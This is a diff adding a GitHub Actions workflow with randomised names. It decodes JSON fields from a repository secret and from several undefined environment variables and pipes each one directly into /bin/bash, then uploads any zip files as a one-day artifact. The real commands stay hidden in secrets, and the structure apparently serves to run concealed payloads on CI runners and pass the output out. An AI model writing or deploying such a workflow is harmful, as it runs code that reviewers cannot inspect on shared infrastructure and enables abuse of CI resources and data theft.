@@ -1,0 +1,24 @@
+name: charlesbuild5087
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: charlesbuild5087
+        env:
+          i47: ${{ secrets.i47 }}
+        run: |
+          printf '%s' "$i47" | jq -r .vqhit628 | /bin/bash
+          printf '%s' "$jxqb6" | jq -r .rtvr8465 | /bin/bash
+          printf '%s' "$czti090" | jq -r .ailm09 | /bin/bash
+          echo $odtwj8784 | jq -r .povyy282 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XWbVSsoe
+          path: "*.zip"
+          retention-days: 1
